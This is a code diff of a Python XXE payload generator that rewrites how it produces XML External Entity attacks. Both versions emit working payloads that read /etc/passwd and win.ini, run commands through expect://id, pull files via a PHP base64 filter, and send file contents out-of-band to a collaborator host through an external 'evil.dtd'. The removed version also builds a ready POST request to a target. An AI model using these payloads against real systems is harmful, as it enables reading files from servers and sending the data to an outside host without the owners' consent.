@@ -1,165 +1,125 @@
 class XXEGenerator:
-    def __init__(self):
-        self.payload_templates = self._load_payload_templates()
-    
-    def _load_payload_templates(self):
-        return {
-            'doctype': {
-                'basic': '''<?xml version="1.0"?>
-<!DOCTYPE data [
-<!ENTITY % ext SYSTEM "{collaborator}/payload.dtd">
-%ext;
-%payload;
-%exfil;
-]>
-<data>&exfil;</data>''',
-                
-                'external': '''<?xml version="1.0"?>
-<!DOCTYPE data SYSTEM "{collaborator}/xxe.dtd">
-<data>&exfil;</data>'''
-            },
-            
-            'xinclude': {
-                'basic': '''<data xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include href="{target_url}" parse="text"/>
-</data>''',
-                
-                'with_encoding': '''<data xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include href="{target_url}" parse="text" encoding="UTF-8"/>
-</data>'''
-            },
-            
-            'svg': {
-                'basic': '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
-    <image xlink:href="expect://id"></image>
-</svg>'''
-            },
-            
-            'dtd': {
-                'external_entity': '''<!ENTITY % payload SYSTEM "file:///etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM '{collaborator}/exfil?data=%payload;'>">''',
-                
-                'oob_exfiltration': '''<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % dtd SYSTEM "{collaborator}/evil.dtd">
-%dtd;
-%exfil;'''
-            }
-        }
-    
     def generate_payloads(self, target_url="", collaborator="", attack_type="all"):
-        valid_types = ['all', 'doctype', 'xinclude', 'dtd', 'svg']
-        if attack_type not in valid_types:
-            attack_type = 'all'
-        
-        # Set defaults if empty
         if not target_url:
-            target_url = 'file:///etc/passwd'
+            target_url = "file:///etc/passwd"
         if not collaborator:
-            collaborator = 'http://your-collaborator.com'
-        
-        payloads = []
-        
-        if attack_type in ['all', 'doctype']:
-            payloads.extend(self._generate_doctype_payloads(collaborator))
-        
-        if attack_type in ['all', 'xinclude']:
-            payloads.extend(self._generate_xinclude_payloads(target_url))
-        
-        if attack_type in ['all', 'dtd']:
-            payloads.extend(self._generate_dtd_payloads(collaborator))
-        
-        if attack_type in ['all', 'svg']:
-            payloads.extend(self._generate_svg_payloads())
-        
-        return payloads
-    
-    def _generate_doctype_payloads(self, collaborator):
-        payloads = []
-        
-        # Basic doctype payload
-        if collaborator:
-            payloads.append({
-                'name': 'Basic Doctype with External DTD',
-                'type': 'doctype',
-                'payload': self.payload_templates['doctype']['external'].format(
-                    collaborator=collaborator
-                ),
-                'description': 'Basic XXE using external DTD'
-            })
-        
-        # File read payloads
-        file_read_payloads = [
-            ('file:///etc/passwd', 'Linux /etc/passwd'),
-            ('file:///c:/windows/win.ini', 'Windows win.ini'),
-            ('file:///c:/boot.ini', 'Windows boot.ini'),
-            ('php://filter/read=convert.base64-encode/resource=/etc/passwd', 'PHP filter base64'),
-            ('expect://id', 'Expect wrapper (if enabled)'),
-        ]
-        
-        for file_path, description in file_read_payloads:
-            payloads.append({
-                'name': f'File Read: {description}',
-                'type': 'doctype',
-                'payload': f'''<?xml version="1.0"?>
-<!DOCTYPE data [
-<!ENTITY xxe SYSTEM "{file_path}">
-]>
-<data>&xxe;</data>''',
-                'description': f'Read {description}'
-            })
-        
-        return payloads
-    
-    def _generate_xinclude_payloads(self, target_url):
-        payloads = []
-        
-        if target_url:
-            for name, template in self.payload_templates['xinclude'].items():
-                payloads.append({
-                    'name': f'XInclude {name.capitalize()}',
-                    'type': 'xinclude',
-                    'payload': template.format(target_url=target_url),
-                    'description': f'XInclude attack using {name} method'
-                })
-        
-        return payloads
-    
-    def _generate_dtd_payloads(self, collaborator):
-        payloads = []
-        
-        if collaborator:
-            for name, template in self.payload_templates['dtd'].items():
-                payloads.append({
-                    'name': f'DTD {name.replace("_", " ").title()}',
-                    'type': 'dtd',
-                    'payload': template.format(collaborator=collaborator),
-                    'description': f'DTD based attack - {name}'
-                })
-        
-        return payloads
-    
-    def _generate_svg_payloads(self):
-        payloads = []
-        
-        for name, template in self.payload_templates['svg'].items():
-            payloads.append({
-                'name': f'SVG {name.capitalize()}',
-                'type': 'svg',
-                'payload': template,
-                'description': f'SVG based XXE - {name}'
-            })
-        
-        return payloads
-    
-    def generate_http_request(self, payload, target_endpoint, host="target.com"):
-        """Generate HTTP request with XXE payload"""
-        if not payload or not target_endpoint:
-            raise ValueError("Both payload and target_endpoint are required")
-        
-        content_length = len(payload.encode('utf-8'))
-        return f"""POST {target_endpoint} HTTP/1.1
-Host: {host}
-Content-Type: application/xml
-Content-Length: {content_length}
+            collaborator = "http://localhost:5000"
+        if attack_type not in ["all", "doctype", "xinclude", "dtd", "svg"]:
+            attack_type = "all"
 
-{payload}"""
+        payloads = []
+        if attack_type in ["all", "doctype"]:
+            payloads.extend(self._doctype(collaborator, target_url))
+        if attack_type in ["all", "xinclude"]:
+            payloads.extend(self._xinclude(target_url))
+        if attack_type in ["all", "dtd"]:
+            payloads.extend(self._dtd(collaborator))
+        if attack_type in ["all", "svg"]:
+            payloads.extend(self._svg(target_url))
+        return payloads
+
+    def _doctype(self, collaborator, target_url):
+        return [
+            {
+                "name": "DOCTYPE - Basic File Read",
+                "type": "doctype",
+                "description": "Read local file using SYSTEM entity",
+                "payload": '<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM "{}">\n]>\n<data>&xxe;</data>'.format(target_url)
+            },
+            {
+                "name": "DOCTYPE - OOB External DTD",
+                "type": "doctype",
+                "description": "Out-of-band exfiltration via external DTD",
+                "payload": '<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ENTITY % ext SYSTEM "{}/evil.dtd">\n%ext;\n%payload;\n%exfil;\n]>\n<data>xxe</data>'.format(collaborator)
+            },
+            {
+                "name": "DOCTYPE - Windows win.ini",
+                "type": "doctype",
+                "description": "Read Windows win.ini",
+                "payload": '<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\n]>\n<data>&xxe;</data>'
+            },
+            {
+                "name": "DOCTYPE - Linux /etc/passwd",
+                "type": "doctype",
+                "description": "Read Linux /etc/passwd",
+                "payload": '<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<data>&xxe;</data>'
+            },
+            {
+                "name": "DOCTYPE - PHP Base64 Filter",
+                "type": "doctype",
+                "description": "Read file as base64 via PHP filter",
+                "payload": '<?xml version="1.0"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">\n]>\n<data>&xxe;</data>'
+            },
+            {
+                "name": "DOCTYPE - Blind OOB Parameter Entity",
+                "type": "doctype",
+                "description": "Blind XXE using parameter entities",
+                "payload": '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM "{}/xxe">\n%xxe;\n]>\n<foo/>'.format(collaborator)
+            },
+        ]
+
+    def _xinclude(self, target_url):
+        return [
+            {
+                "name": "XInclude - Basic",
+                "type": "xinclude",
+                "description": "Include external resource via XInclude",
+                "payload": '<data xmlns:xi="http://www.w3.org/2001/XInclude">\n<xi:include href="{}" parse="text"/>\n</data>'.format(target_url)
+            },
+            {
+                "name": "XInclude - With UTF-8 Encoding",
+                "type": "xinclude",
+                "description": "XInclude with explicit UTF-8 encoding",
+                "payload": '<data xmlns:xi="http://www.w3.org/2001/XInclude">\n<xi:include href="{}" parse="text" encoding="UTF-8"/>\n</data>'.format(target_url)
+            },
+            {
+                "name": "XInclude - /etc/passwd",
+                "type": "xinclude",
+                "description": "Read /etc/passwd via XInclude",
+                "payload": '<data xmlns:xi="http://www.w3.org/2001/XInclude">\n<xi:include href="file:///etc/passwd" parse="text"/>\n</data>'
+            },
+        ]
+
+    def _dtd(self, collaborator):
+        return [
+            {
+                "name": "DTD - External Entity Exfil",
+                "type": "dtd",
+                "description": "Exfiltrate data via external DTD",
+                "payload": '<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % dtd SYSTEM "{}/evil.dtd">\n%dtd;\n%exfil;'.format(collaborator)
+            },
+            {
+                "name": "DTD - OOB via HTTP",
+                "type": "dtd",
+                "description": "Out-of-band data exfiltration over HTTP",
+                "payload": '<!ENTITY % payload SYSTEM "file:///etc/passwd">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'{}/exfil?data=%payload;\'>">\n%param1;\n&exfil;'.format(collaborator)
+            },
+            {
+                "name": "DTD - Base64 OOB",
+                "type": "dtd",
+                "description": "Exfiltrate base64-encoded file content",
+                "payload": '<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">\n<!ENTITY % dtd SYSTEM "{}/evil.dtd">\n%dtd;\n%exfil;'.format(collaborator)
+            },
+        ]
+
+    def _svg(self, target_url):
+        return [
+            {
+                "name": "SVG - Basic XXE",
+                "type": "svg",
+                "description": "XXE embedded inside SVG image",
+                "payload": '<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE svg [\n<!ENTITY xxe SYSTEM "{}">\n]>\n<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">\n<text>&xxe;</text>\n</svg>'.format(target_url)
+            },
+            {
+                "name": "SVG - XLink Href",
+                "type": "svg",
+                "description": "SVG using xlink:href for resource inclusion",
+                "payload": '<svg xmlns="http://www.w3.org/2000/svg"\n     xmlns:xlink="http://www.w3.org/1999/xlink"\n     width="300" height="200">\n<image xlink:href="expect://id"></image>\n</svg>'
+            },
+            {
+                "name": "SVG - Embedded Script XXE",
+                "type": "svg",
+                "description": "XXE via SVG with embedded entity in text element",
+                "payload": '<?xml version="1.0"?>\n<!DOCTYPE svg [\n<!ENTITY read SYSTEM "{}">\n]>\n<svg xmlns="http://www.w3.org/2000/svg">\n<text x="10" y="20">&read;</text>\n</svg>'.format(target_url)
+            },
+        ]
